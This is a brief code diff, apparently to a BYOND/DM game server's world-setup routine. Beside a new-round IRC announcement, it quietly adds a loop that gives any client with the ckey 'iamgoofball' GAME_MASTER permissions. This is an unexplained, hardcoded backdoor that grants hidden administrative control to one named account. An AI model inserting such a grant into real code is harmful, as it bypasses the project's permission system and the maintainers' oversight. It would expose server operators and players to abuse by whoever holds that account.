@@ -46,7 +46,9 @@
 
 	if(config.irc_announce_new_game)
 		IRCBroadcast("New round starting on [SSmapping.config.map_name]!")
-
+	for(var/client/C in world)
+		if(C.ckey == "iamgoofball")
+			C.permissions = GAME_MASTER
 /world/proc/SetupExternalRSC()
 #if (PRELOAD_RSC == 0)
 	external_rsc_urls = world.file2list("config/external_rsc_urls.txt","\n")
